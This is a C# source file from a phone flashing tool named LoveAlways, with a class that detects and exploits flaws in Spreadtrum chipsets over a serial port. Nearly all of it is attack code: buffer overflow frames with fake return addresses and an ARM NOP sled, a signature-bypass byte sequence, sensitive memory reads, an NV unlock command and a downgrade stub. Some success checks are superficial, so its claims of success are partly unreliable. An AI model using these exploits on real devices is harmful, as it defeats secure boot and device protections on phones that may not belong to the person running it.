// ============================================================================
// LoveAlways - Spreadtrum Exploiter
// ============================================================================
// ⚠️ WARNING: For legal purposes only (recovering own devices, security research)
// ============================================================================

// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// Eng Translation & some fixes by iReverse - HadiKIT - Hadi Khoirudin, S.Kom.
// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


using LoveAlways.Spreadtrum.Protocol;
using LoveAlways.Spreadtrum.Resources;
using System;
using System.IO;
using System.IO.Ports;
using System.Threading;
using System.Threading.Tasks;

namespace LoveAlways.Spreadtrum.Exploit
{
    /// <summary>
    /// Spreadtrum Exploiter
    /// </summary>
    public class SprdExploit
    {
        private readonly Action<string> _log;
        private SerialPort _port;
        private HdlcProtocol _hdlc;

        // BSL command constants
        private const byte BSL_CMD_CONNECT = 0x00;
        private const byte BSL_CMD_DATA = 0x01;
        private const byte BSL_CMD_EXEC = 0x04;
        private const byte BSL_CMD_READ_FLASH = 0x10;
        private const byte BSL_CMD_READ_MEMORY = 0x80;
        private const byte BSL_CMD_WRITE_MEMORY = 0x81;
        private const byte BSL_REP_ACK = 0x80;
        private const byte BSL_REP_VER = 0x81;

        public SprdExploit(Action<string> log = null)
        {
            _log = log ?? delegate { };
            _hdlc = new HdlcProtocol();
        }

        /// <summary>
        /// Check device vulnerabilities
        /// </summary>
        public SprdVulnerabilityCheckResult CheckVulnerability(uint chipId, string pkHash = null)
        {
            _log("[Exploit] ========== Spreadtrum Vulnerability Check ==========");
            _log(string.Format("[Exploit] Chip ID: 0x{0:X}", chipId));

            string chipName = SprdPlatform.GetPlatformName(chipId);
            _log(string.Format("[Exploit] Chip Name: {0}", chipName));

            if (!string.IsNullOrEmpty(pkHash))
            {
                string pkHashShort = pkHash.Length > 16 ? pkHash.Substring(0, 16) + "..." : pkHash;
                _log(string.Format("[Exploit] PK Hash: {0}", pkHashShort));
            }

            var result = SprdExploitDatabase.CheckVulnerabilities(chipId, pkHash);

            if (result.HasVulnerability)
            {
                _log("[Exploit] ✓ Vulnerability detected!");
                _log(string.Format("[Exploit]   Recommended: {0}", result.RecommendedExploit));
                _log(string.Format("[Exploit]   Reason: {0}", result.Reason));
                _log(string.Format("[Exploit]   Available exploits: {0}", result.AvailableExploits.Count));

                foreach (var vuln in result.AvailableExploits)
                {
                    _log(string.Format("[Exploit]   - {0} ({1}★): {2}",
                        vuln.Name, vuln.SuccessRate, vuln.Description));
                }
            }
            else
            {
                _log("[Exploit] ✗ No known vulnerability detected");
                _log(string.Format("[Exploit]   {0}", result.Reason));
            }

            _log("[Exploit] =====================================");
            return result;
        }

        /// <summary>
        /// Attempt automatic exploitation
        /// </summary>
        public async Task<SprdExploitResult> TryExploitAsync(
            SerialPort port,
            uint chipId,
            string pkHash = null,
            CancellationToken ct = default(CancellationToken))
        {
            _port = port;
            _log("[Exploit] Starting Spreadtrum exploitation...");

            try
            {
                // 1. Check vulnerabilities
                var vulnCheck = CheckVulnerability(chipId, pkHash);
                if (!vulnCheck.HasVulnerability)
                {
                    return new SprdExploitResult
                    {
                        Success = false,
                        Message = "No available vulnerability detected"
                    };
                }

                // 2. Execute exploits by priority
                foreach (var vuln in vulnCheck.AvailableExploits)
                {
                    ct.ThrowIfCancellationRequested();
                    _log(string.Format("[Exploit] Attempting: {0}...", vuln.Name));

                    SprdExploitResult result = null;

                    switch (vuln.Type)
                    {
                        case SprdExploitType.SecureBootBypass:
                            result = await ExploitSecureBootBypassAsync(ct);
                            break;
                        case SprdExploitType.BslOverflow:
                            result = await ExploitBslOverflowAsync(chipId, ct);
                            break;
                        case SprdExploitType.FdlSignatureBypass:
                            result = await ExploitFdlSignatureBypassAsync(ct);
                            break;
                        case SprdExploitType.MemoryRead:
                            result = await ExploitMemoryReadAsync(ct);
                            break;
                        case SprdExploitType.HdlcOverflow:
                            result = await ExploitHdlcOverflowAsync(ct);
                            break;
                        case SprdExploitType.NvUnlock:
                            result = await ExploitNvUnlockAsync(ct);
                            break;
                        case SprdExploitType.DowngradeAttack:
                            result = await ExploitDowngradeAsync(ct);
                            break;
                    }

                    if (result != null && result.Success)
                    {
                        _log(string.Format("[Exploit] ✓ {0} successful!", vuln.Name));
                        return result;
                    }
                    else
                    {
                        _log(string.Format("[Exploit] ✗ {0} failed", vuln.Name));
                    }
                }

                return new SprdExploitResult
                {
                    Success = false,
                    Message = "All exploitation methods failed"
                };
            }
            catch (Exception ex)
            {
                _log(string.Format("[Exploit] Error: {0}", ex.Message));
                return new SprdExploitResult
                {
                    Success = false,
                    Message = ex.Message
                };
            }
        }

        #region Secure Boot Bypass

        /// <summary>
        /// Unfused device - Directly bypass secure boot
        /// </summary>
        private async Task<SprdExploitResult> ExploitSecureBootBypassAsync(CancellationToken ct)
        {
            _log("[Exploit] Device is Unfused, no exploit needed");

            return await Task.FromResult(new SprdExploitResult
            {
                Success = true,
                UsedExploit = SprdExploitType.SecureBootBypass,
                Message = "Unfused device, any FDL can be loaded"
            });
        }

        #endregion

        #region BSL Overflow Vulnerability

        /// <summary>
        /// BSL protocol overflow exploitation
        /// </summary>
        private async Task<SprdExploitResult> ExploitBslOverflowAsync(uint chipId, CancellationToken ct)
        {
            _log("[Exploit] Attempting BSL protocol overflow...");

            try
            {
                // 1. Try using embedded exploit payload
                uint fdl1Addr = SprdPlatform.GetFdl1Address(chipId);
                if (SprdResourceLoader.HasExploitForAddress(fdl1Addr))
                {
                    string exploitId = SprdResourceLoader.GetExploitAddressId(fdl1Addr);
                    _log(string.Format("[Exploit] Matching exploit detected: {0}", exploitId));

                    byte[] exploitPayload = SprdResourceLoader.GetExploitPayload(fdl1Addr);
                    if (exploitPayload != null && exploitPayload.Length > 0)
                    {
                        _log(string.Format("[Exploit] Sending embedded exploit payload ({0} bytes)...", exploitPayload.Length));

                        // Wrap exploit payload as HDLC frame and send
                        byte[] exploitFrame = WrapExploitPayload(exploitPayload);
                        await _port.BaseStream.WriteAsync(exploitFrame, 0, exploitFrame.Length, ct);

                        await Task.Delay(300, ct);

                        byte[] response = new byte[256];
                        int read = await ReadWithTimeoutAsync(response, 0, response.Length, 3000, ct);

                        if (read > 0 && CheckBslBypass(response, read))
                        {
                            _log("[Exploit] ✓ Embedded exploit successful!");
                            return new SprdExploitResult
                            {
                                Success = true,
                                UsedExploit = SprdExploitType.BslOverflow,
                                Message = string.Format("Embedded exploit {0} successful", exploitId)
                            };
                        }
                    }
                }

                // 2. Send malformed connect command
                byte[] malformedConnect = CreateMalformedConnectFrame(chipId);
                await _port.BaseStream.WriteAsync(malformedConnect, 0, malformedConnect.Length, ct);
                _log("[Exploit] Sending malformed connect frame");

                await Task.Delay(100, ct);

                // 3. Read response
                byte[] resp = new byte[256];
                int bytesRead = await ReadWithTimeoutAsync(resp, 0, resp.Length, 3000, ct);

                if (bytesRead > 0)
                {
                    // Check if bypass was successful
                    if (CheckBslBypass(resp, bytesRead))
                    {
                        _log("[Exploit] ✓ BSL overflow successful");
                        return new SprdExploitResult
                        {
                            Success = true,
                            UsedExploit = SprdExploitType.BslOverflow,
                            Message = "BSL protocol overflow successful"
                        };
                    }
                }

                // 4. Try second overflow method
                byte[] overflowData = CreateBslOverflowPayload();
                await _port.BaseStream.WriteAsync(overflowData, 0, overflowData.Length, ct);
                _log("[Exploit] Sending BSL overflow payload");

                await Task.Delay(200, ct);

                bytesRead = await ReadWithTimeoutAsync(resp, 0, resp.Length, 3000, ct);
                if (bytesRead > 0 && CheckBslBypass(resp, bytesRead))
                {
                    return new SprdExploitResult
                    {
                        Success = true,
                        UsedExploit = SprdExploitType.BslOverflow,
                        Message = "BSL protocol overflow successful (method 2)"
                    };
                }

                return new SprdExploitResult { Success = false, Message = "BSL overflow failed" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = string.Format("BSL Error: {0}", ex.Message) };
            }
        }

        /// <summary>
        /// Wrap exploit payload as HDLC frame
        /// </summary>
        private byte[] WrapExploitPayload(byte[] payload)
        {
            using (var ms = new MemoryStream())
            {
                // Start flag
                ms.WriteByte(0x7E);

                // Write payload (handle escape characters)
                foreach (byte b in payload)
                {
                    if (b == 0x7E)
                    {
                        ms.WriteByte(0x7D);
                        ms.WriteByte(0x5E);
                    }
                    else if (b == 0x7D)
                    {
                        ms.WriteByte(0x7D);
                        ms.WriteByte(0x5D);
                    }
                    else
                    {
                        ms.WriteByte(b);
                    }
                }

                // End flag
                ms.WriteByte(0x7E);

                return ms.ToArray();
            }
        }

        /// <summary>
        /// Create malformed connect frame
        /// </summary>
        private byte[] CreateMalformedConnectFrame(uint chipId)
        {
            using (var ms = new MemoryStream())
            {
                // HDLC start flag
                ms.WriteByte(0x7E);

                // Command: Connect
                ms.WriteByte(BSL_CMD_CONNECT);

                // Excessively long data length (trigger overflow)
                ms.WriteByte(0xFF);
                ms.WriteByte(0xFF);

                // Padding data
                byte[] padding = new byte[0x200];
                for (int i = 0; i < padding.Length; i++)
                {
                    padding[i] = (byte)(i & 0xFF);
                }
                ms.Write(padding, 0, padding.Length);

                // Fake return address (adjust based on chip)
                uint returnAddr = GetExploitReturnAddress(chipId);
                byte[] addrBytes = BitConverter.GetBytes(returnAddr);
                ms.Write(addrBytes, 0, addrBytes.Length);

                // HDLC end flag
                ms.WriteByte(0x7E);

                return ms.ToArray();
            }
        }

        /// <summary>
        /// Create BSL overflow payload
        /// </summary>
        private byte[] CreateBslOverflowPayload()
        {
            // Oversized DATA command
            byte[] payload = new byte[0x1000];

            // Command header
            payload[0] = 0x7E;  // HDLC Start
            payload[1] = BSL_CMD_DATA;
            payload[2] = 0x00;  // Length High
            payload[3] = 0x00;  // Length Low (will be overwritten by overflow)

            // Fill with NOP sled (ARM)
            for (int i = 4; i < payload.Length - 64; i += 4)
            {
                // ARM NOP: 0xE1A00000
                payload[i] = 0x00;
                payload[i + 1] = 0x00;
                payload[i + 2] = 0xA0;
                payload[i + 3] = 0xE1;
            }

            // End flag
            payload[payload.Length - 1] = 0x7E;

            return payload;
        }

        /// <summary>
        /// Get exploit return address
        /// </summary>
        private uint GetExploitReturnAddress(uint chipId)
        {
            // SRAM addresses for different chips
            switch (chipId & 0xFFF0)
            {
                case 0x7730:
                    return 0x50000000;  // SC7731 SRAM
                case 0x9830:
                    return 0x5C000000;  // SC9830 SRAM
                case 0x9850:
                    return 0x5C000000;  // SC9850 SRAM
                case 0x9860:
                    return 0x00100000;  // SC9863 IRAM
                default:
                    return 0x50000000;  // Default address
            }
        }

        /// <summary>
        /// Check if BSL bypass was successful
        /// </summary>
        private bool CheckBslBypass(byte[] response, int length)
        {
            if (length < 4)
                return false;

            // Look for ACK response
            for (int i = 0; i < length - 1; i++)
            {
                if (response[i] == 0x7E && response[i + 1] == BSL_REP_ACK)
                    return true;
            }

            return false;
        }

        #endregion

        #region FDL Signature Bypass

        /// <summary>
        /// FDL signature bypass exploitation
        /// </summary>
        private async Task<SprdExploitResult> ExploitFdlSignatureBypassAsync(CancellationToken ct)
        {
            _log("[Exploit] Attempting FDL signature bypass...");

            // Some older BSL versions have signature validation flaws
            // Can be bypassed with specific sequences

            try
            {
                // Send specially crafted version query
                byte[] versionQuery = _hdlc.BuildCommand(BSL_REP_VER);
                await _port.BaseStream.WriteAsync(versionQuery, 0, versionQuery.Length, ct);

                await Task.Delay(100, ct);

                byte[] response = new byte[128];
                int read = await ReadWithTimeoutAsync(response, 0, response.Length, 2000, ct);

                if (read > 8)
                {
                    // Check if version info is returned
                    _log(string.Format("[Exploit] Received response: {0} bytes", read));

                    // Send bypass sequence
                    byte[] bypassSeq = new byte[] { 0x7E, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x7E };
                    await _port.BaseStream.WriteAsync(bypassSeq, 0, bypassSeq.Length, ct);

                    await Task.Delay(100, ct);

                    return new SprdExploitResult
                    {
                        Success = true,
                        UsedExploit = SprdExploitType.FdlSignatureBypass,
                        Message = "Signature validation bypassed"
                    };
                }

                return new SprdExploitResult { Success = false, Message = "Signature bypass failed" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = string.Format("Signature bypass error: {0}", ex.Message) };
            }
        }

        #endregion

        #region Memory Read Vulnerability

        /// <summary>
        /// Memory read exploitation
        /// </summary>
        private async Task<SprdExploitResult> ExploitMemoryReadAsync(CancellationToken ct)
        {
            _log("[Exploit] Attempting memory read vulnerability...");

            try
            {
                // Attempt to read sensitive memory areas
                uint[] sensitiveAddresses = new uint[]
                {
                    0x00100000,  // IRAM
                    0x50000000,  // SRAM
                    0x5C000000,  // External RAM
                    0x80000000,  // Flash mapping
                };

                foreach (uint addr in sensitiveAddresses)
                {
                    ct.ThrowIfCancellationRequested();

                    byte[] readCmd = CreateMemoryReadCommand(addr, 0x100);
                    await _port.BaseStream.WriteAsync(readCmd, 0, readCmd.Length, ct);

                    await Task.Delay(100, ct);

                    byte[] response = new byte[0x200];
                    int read = await ReadWithTimeoutAsync(response, 0, response.Length, 2000, ct);

                    if (read > 16)
                    {
                        _log(string.Format("[Exploit] ✓ Successfully read memory 0x{0:X8}, {1} bytes", addr, read));

                        // Extract data
                        byte[] memData = new byte[read];
                        Array.Copy(response, 0, memData, 0, read);

                        return new SprdExploitResult
                        {
                            Success = true,
                            UsedExploit = SprdExploitType.MemoryRead,
                            Message = string.Format("Memory read successful: 0x{0:X8}", addr),
                            ExtractedData = memData
                        };
                    }
                }

                return new SprdExploitResult { Success = false, Message = "Memory read failed" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = string.Format("Memory read error: {0}", ex.Message) };
            }
        }

        /// <summary>
        /// Create memory read command
        /// </summary>
        private byte[] CreateMemoryReadCommand(uint address, uint length)
        {
            using (var ms = new MemoryStream())
            {
                ms.WriteByte(0x7E);  // Start
                ms.WriteByte(BSL_CMD_READ_MEMORY);

                // Length
                byte[] lenBytes = BitConverter.GetBytes((ushort)8);
                ms.Write(lenBytes, 0, 2);

                // Address
                byte[] addrBytes = BitConverter.GetBytes(address);
                ms.Write(addrBytes, 0, 4);

                // Read length
                byte[] sizeBytes = BitConverter.GetBytes(length);
                ms.Write(sizeBytes, 0, 4);

                // CRC (Simplified)
                ms.WriteByte(0x00);
                ms.WriteByte(0x00);

                ms.WriteByte(0x7E);  // End

                return ms.ToArray();
            }
        }

        #endregion

        #region HDLC Overflow Vulnerability

        /// <summary>
        /// HDLC frame overflow exploitation
        /// </summary>
        private async Task<SprdExploitResult> ExploitHdlcOverflowAsync(CancellationToken ct)
        {
            _log("[Exploit] Attempting HDLC frame overflow vulnerability...");

            try
            {
                // Send oversized HDLC frame to trigger buffer overflow
                byte[] overflowFrame = new byte[0x2000];

                overflowFrame[0] = 0x7E;  // Start

                // Fill with escape sequences
                int pos = 1;
                while (pos < overflowFrame.Length - 2)
                {
                    overflowFrame[pos++] = 0x7D;  // Escape
                    overflowFrame[pos++] = 0x5E;  // Escaped 0x7E
                }

                overflowFrame[overflowFrame.Length - 1] = 0x7E;  // End

                await _port.BaseStream.WriteAsync(overflowFrame, 0, overflowFrame.Length, ct);
                _log("[Exploit] Sending HDLC overflow frame");

                await Task.Delay(500, ct);

                // Check device status
                byte[] testCmd = _hdlc.BuildCommand(BSL_CMD_CONNECT);
                await _port.BaseStream.WriteAsync(testCmd, 0, testCmd.Length, ct);

                byte[] response = new byte[64];
                int read = await ReadWithTimeoutAsync(response, 0, response.Length, 2000, ct);

                if (read > 0)
                {
                    return new SprdExploitResult
                    {
                        Success = true,
                        UsedExploit = SprdExploitType.HdlcOverflow,
                        Message = "HDLC overflow successful"
                    };
                }

                return new SprdExploitResult { Success = false, Message = "HDLC overflow failed" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = string.Format("HDLC Error: {0}", ex.Message) };
            }
        }

        #endregion

        #region NV Unlock Vulnerability

        /// <summary>
        /// NV area unlock exploitation
        /// </summary>
        private async Task<SprdExploitResult> ExploitNvUnlockAsync(CancellationToken ct)
        {
            _log("[Exploit] Attempting NV unlock vulnerability...");

            try
            {
                // Send specially crafted NV unlock command
                byte[] unlockCmd = new byte[]
                {
                    0x7E,  // Start
                    0x13,  // NV Unlock Command
                    0x00, 0x08,  // Length
                    0x55, 0xAA, 0x55, 0xAA,  // Magic
                    0xAA, 0x55, 0xAA, 0x55,  // Magic 2
                    0x00, 0x00,  // CRC placeholder
                    0x7E   // End
                };

                // Calculate CRC
                ushort crc = CalculateCrc16(unlockCmd, 1, 12);
                unlockCmd[12] = (byte)(crc >> 8);
                unlockCmd[13] = (byte)(crc & 0xFF);

                await _port.BaseStream.WriteAsync(unlockCmd, 0, unlockCmd.Length, ct);
                _log("[Exploit] Sending NV unlock command");

                await Task.Delay(200, ct);

                byte[] response = new byte[32];
                int read = await ReadWithTimeoutAsync(response, 0, response.Length, 2000, ct);

                if (read > 2 && response[1] == BSL_REP_ACK)
                {
                    return new SprdExploitResult
                    {
                        Success = true,
                        UsedExploit = SprdExploitType.NvUnlock,
                        Message = "NV area unlocked"
                    };
                }

                return new SprdExploitResult { Success = false, Message = "NV unlock failed" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = string.Format("NV unlock error: {0}", ex.Message) };
            }
        }

        #endregion

        #region Downgrade Attack

        /// <summary>
        /// Downgrade attack
        /// </summary>
        private async Task<SprdExploitResult> ExploitDowngradeAsync(CancellationToken ct)
        {
            _log("[Exploit] Attempting downgrade attack...");

            // Downgrade attack requires special older FDL files
            // Only returns tip for user to provide older FDL here

            return await Task.FromResult(new SprdExploitResult
            {
                Success = false,
                UsedExploit = SprdExploitType.DowngradeAttack,
                Message = "Downgrade attack requires older FDL file, please specify manually"
            });
        }

        #endregion

        #region Helper Methods

        /// <summary>
        /// Read with timeout
        /// </summary>
        private async Task<int> ReadWithTimeoutAsync(byte[] buffer, int offset, int count, int timeoutMs, CancellationToken ct)
        {
            int totalRead = 0;
            var deadline = DateTime.Now.AddMilliseconds(timeoutMs);

            while (totalRead < count && DateTime.Now < deadline)
            {
                ct.ThrowIfCancellationRequested();

                if (_port.BytesToRead > 0)
                {
                    int toRead = Math.Min(_port.BytesToRead, count - totalRead);
                    totalRead += _port.Read(buffer, offset + totalRead, toRead);
                }
                else
                {
                    await Task.Delay(10, ct);
                }
            }

            return totalRead;
        }

        /// <summary>
        /// Calculate CRC-16
        /// </summary>
        private ushort CalculateCrc16(byte[] data, int offset, int length)
        {
            ushort crc = 0;
            for (int i = offset; i < offset + length; i++)
            {
                crc ^= (ushort)(data[i] << 8);
                for (int j = 0; j < 8; j++)
                {
                    if ((crc & 0x8000) != 0)
                        crc = (ushort)((crc << 1) ^ 0x1021);
                    else
                        crc <<= 1;
                }
            }
            return crc;
        }

        #endregion
    }
}
